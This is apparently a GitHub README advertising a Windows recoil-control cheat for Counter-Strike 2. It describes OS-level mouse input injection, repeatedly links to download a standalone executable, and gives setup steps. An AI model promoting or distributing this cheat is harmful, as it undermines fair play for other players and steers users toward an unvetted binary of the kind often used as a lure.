# CS2 Recoil Controller v2026 - Game Script Utility 2026

> **Windows utility for Counter-Strike 2 that applies user-defined mouse input offsets so spray control stays closer to a chosen pattern while an activation key is held.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hannes-price170/cs2-recoil-controller-win?style=flat-square)](https://github.com/hannes-price170/cs2-recoil-controller-win)

---

<p align="center">
  <a href="https://hannes-price170.github.io/cs2-recoil-controller-win/">
    <img src="https://img.shields.io/badge/Download-CS2%20Recoil%20Controller%20Script-brightgreen?style=for-the-badge" alt="Download CS2 Recoil Controller Script">
  </a>
</p>

> **[Direct Download - CS2 Recoil Controller](https://hannes-price170.github.io/cs2-recoil-controller-win/)**

---

[Download Latest Build](https://hannes-price170.github.io/cs2-recoil-controller-win/)

---

## What it is

CS2 Recoil Controller runs on Windows alongside Counter-Strike 2 (Source 2). While you hold a hotkey you choose, it injects compensation through the OS input path using curves tied to individual weapons. The goal is steadier, repeatable spray input without living inside the game process.

You get profile switching, sensitivity and DPI alignment, tunable smoothing, and an optional on-screen cue. The package is a standalone executable meant to stay offline and light on CPU.

---

## What you can configure

- Compensation curves mapped per weapon spray
- Profiles so you can swap full setting sets quickly
- Live sync with your in-game sensitivity and mouse DPI
- Smoothing strength for how compensation ramps
- Activation only while a hotkey is held
- Optional overlay for visual confirmation
- Input handled at the OS level via a standalone Windows binary
- Local, offline use with modest resource draw

---

## Getting started

1. Grab the current Windows package from the [download page](https://hannes-price170.github.io/cs2-recoil-controller-win/).
2. Unpack the archive wherever you want the tool to live.
3. Run the executable directly (no installer required).
4. Pick an existing weapon profile or create one.
5. Set sensitivity and DPI in the tool to mirror your CS2 and mouse setup.
6. Bind an activation hotkey and dial smoothing to taste.
7. Launch Counter-Strike 2; hold the hotkey whenever that profile should drive compensation.

Leave the binary next to its config files so profiles and preferences load again next time.

---

## Settings reference

| Setting | Purpose |
|---|---|
| Weapon profile | Selects the compensation curve for the current weapon |
| Sensitivity | Matches the in-game mouse sensitivity |
| DPI | Matches the configured mouse DPI |
| Smoothing | Adjusts how gradually compensation input is applied |
| Activation hotkey | Controls when the utility becomes active |
| Visual feedback | Enables or disables the optional overlay |
| Offline mode | Keeps operation local to the Windows system |

Typical values look like this:

```text
Weapon Profile: AK-47
Sensitivity: Match CS2
DPI: Match mouse
Smoothing: Medium
Activation Hotkey: User selected
Visual Feedback: Optional
```

---

## Supported environment

- **Game:** Counter-Strike 2
- **Engine:** Source 2
- **Platform:** Windows
- **Distribution:** Standalone executable
- **Operation:** Offline

Behavior hinges on Windows input APIs plus the sensitivity and DPI you enter. If CS2 changes mouse handling, weapon recoil, or you change DPI/sens, retune the profiles. Other titles and non-Windows OSes are out of scope.

Follow the game’s rules, platform terms, and any laws that apply where you play.

---

## Changelog

### 2026

- Configurable compensation curves on a per-weapon basis
- Sensitivity and DPI sync against your real setup
- Smoothing knobs for softer or sharper input blends
- Hotkey-only activation path
- Weapon profile create/switch workflow
- Optional visual feedback overlay
- Still a standalone Windows build aimed at offline use

---

## FAQ

### How do I install the controller?

Fetch the latest Windows build, extract it, and start the executable. Keep configs in that same directory.

### How do I update to a newer build?

Download the new release and swap in the fresh executable. Copy or export profiles beforehand if you care about custom curves and settings.

### Can I customize the compensation behavior?

Yes. Choose a weapon profile, then tune sensitivity, DPI match, smoothing, and the activation key. Curves are meant to be edited per weapon.

### Which versions are supported?

Counter-Strike 2 on Windows under Source 2. Patches to the game can invalidate old profiles until you adjust them.

### Does it require an internet connection?

Runtime use is offline. You only need the network to obtain builds.

### Where are my settings stored?

Profiles and preferences sit with the app files unless a given build documents another path. Do not split the folder when you move or upgrade.

### Can I use it on another operating system?

Only Windows is listed as supported.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
